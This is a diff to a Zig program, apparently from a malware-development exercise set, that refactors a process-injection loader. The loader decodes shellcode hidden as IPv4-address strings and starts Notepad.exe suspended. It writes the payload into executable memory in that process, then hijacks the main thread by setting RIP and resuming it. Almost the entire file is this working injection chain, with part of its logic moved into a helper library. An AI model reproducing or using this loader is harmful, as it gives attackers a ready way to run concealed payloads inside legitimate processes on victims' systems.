@@ -1,28 +1,20 @@
 const std = @import("std");
-const ipv4Deobfuscation = @import("9.payload-obfuscation-ipv4fuscation.zig").ipv4Deobfuscation;
 const win = @import("zigwin32").everything;
+const sec = @import("zig-sec");
+
+const payload_obfuscation = sec.payload_obfuscation;
+const code_injection = sec.code_injection;
 
 const assert = std.debug.assert;
-
-// x86
-// const CONTEXT_CONTROL = 0x00010001;
-
-// x64
-const CONTEXT_CONTROL = 0x00100001;
 
 const STARTUPINFOA = win.STARTUPINFOA;
 const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
 const HANDLE = win.HANDLE;
-const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
 const CONTEXT = win.CONTEXT;
 const INFINITE = win.INFINITE;
 
-const GetEnvironmentVariableA = win.GetEnvironmentVariableA;
 const CreateProcessA = win.CreateProcessA;
 const GetLastError = win.GetLastError;
-const VirtualAllocEx = win.VirtualAllocEx;
-const WriteProcessMemory = win.WriteProcessMemory;
-const VirtualProtectEx = win.VirtualProtectEx;
 const GetThreadContext = win.GetThreadContext;
 const SetThreadContext = win.SetThreadContext;
 const ResumeThread = win.ResumeThread;
@@ -33,15 +25,7 @@ const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.8
 fn createSuspendedProcess(allocator: std.mem.Allocator, process_name: []const u8) !struct { h_process: HANDLE, h_thread: HANDLE } {
     var buf: [1024:0]u8 = undefined;
     buf[1023] = 0;
-    const win_dir_len = GetEnvironmentVariableA("WINDIR", &buf, buf.len);
-
-    assert(win_dir_len <= buf.len);
-    if (win_dir_len == 0) {
-        std.debug.print("[!] GetEnvironmentVariableA Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.GetEnvironmentVariableAFailed;
-    }
-
-    const win_dir = buf[0..win_dir_len];
+    const win_dir = try sec.env.getEnvironmentVariable("WINDIR", &buf);
 
     const path = try std.fmt.allocPrintZ(allocator, "{s}\\System32\\{s}", .{ win_dir, process_name });
     defer allocator.free(path);
@@ -76,63 +60,16 @@ fn createSuspendedProcess(allocator: std.mem.Allocator, process_name: []const u8
     };
 }
 
-fn injectShellcodeToRemoteProcess(h_process: HANDLE, shellcode: []const u8) !*anyopaque {
-    const address = VirtualAllocEx(
-        h_process,
-        null,
-        shellcode.len,
-        .{ .COMMIT = 1, .RESERVE = 1 },
-        .{ .PAGE_READWRITE = 1 },
-    ) orelse {
-        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.VirtualAllocExFailed;
-    };
-
-    var num_of_bytes_written: usize = 0;
-    if (WriteProcessMemory(
-        h_process,
-        address,
-        shellcode.ptr,
-        shellcode.len,
-        &num_of_bytes_written,
-    ) == 0 or num_of_bytes_written != shellcode.len) {
-        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.WriteProcessMemoryFailed;
-    }
-
-    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
-    if (VirtualProtectEx(
-        h_process,
-        address,
-        shellcode.len,
-        .{ .PAGE_EXECUTE_READWRITE = 1 },
-        &old_protection,
-    ) == 0) {
-        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.VirtualProtectExFailed;
-    }
-
-    return address;
-}
-
-fn hijackThread(h_thread: HANDLE, shellcode_address: *anyopaque) !void {
-    var thread_context: CONTEXT = undefined;
-    thread_context.ContextFlags = CONTEXT_CONTROL;
-    if (GetThreadContext(h_thread, &thread_context) == 0) {
-        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.GetThreadContextFailed;
-    }
+fn hijackThread(h_thread: HANDLE, shell_code_region: *anyopaque) !void {
+    const thread_context = try sec.thread.getThreadContext(h_thread);
 
     // X86
-    // thread_context.Eip = @intFromPtr(address);
+    // thread_context.Eip = @intFromPtr(shell_code_region);
 
     // X64
-    thread_context.Rip = @intFromPtr(shellcode_address);
+    thread_context.Rip = @intFromPtr(shell_code_region);
 
-    if (SetThreadContext(h_thread, &thread_context) == 0) {
-        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.SetThreadContextFailed;
-    }
+    try sec.thread.setThreadContext(h_thread, thread_context);
 
     _ = ResumeThread(h_thread);
     _ = WaitForSingleObject(h_thread, INFINITE);
@@ -143,10 +80,10 @@ pub fn main() !void {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    const shellcode = try ipv4Deobfuscation(allocator, &ipv4_array);
-    defer allocator.free(shellcode);
+    const shell_code = try payload_obfuscation.ipv4.deobfuscate(allocator, &ipv4_array);
+    defer allocator.free(shell_code);
 
     const process_info = try createSuspendedProcess(allocator, "Notepad.exe");
-    const shellcode_address = try injectShellcodeToRemoteProcess(process_info.h_process, shellcode);
-    try hijackThread(process_info.h_thread, shellcode_address);
+    const shell_code_region = try code_injection.remote.allocateExecutableMemory(u8, process_info.h_process, shell_code);
+    try hijackThread(process_info.h_thread, shell_code_region);
 }
